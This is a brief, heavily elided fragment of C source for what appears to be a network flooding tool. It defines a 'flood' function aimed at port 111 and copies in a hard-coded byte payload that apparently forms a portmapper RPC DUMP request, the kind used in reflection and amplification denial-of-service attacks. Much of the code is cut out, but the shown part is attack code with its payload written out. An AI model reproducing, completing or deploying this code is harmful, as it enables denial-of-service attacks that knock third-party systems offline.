...
#include <unistd.h>
static unsigned int payloadsize = 50;
static unsigned int xport = 111;
...
void *flood(void *par1)
{
        ...
        memcpy(buf, "\x65\x72\x0a\x37\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", payloadsize);
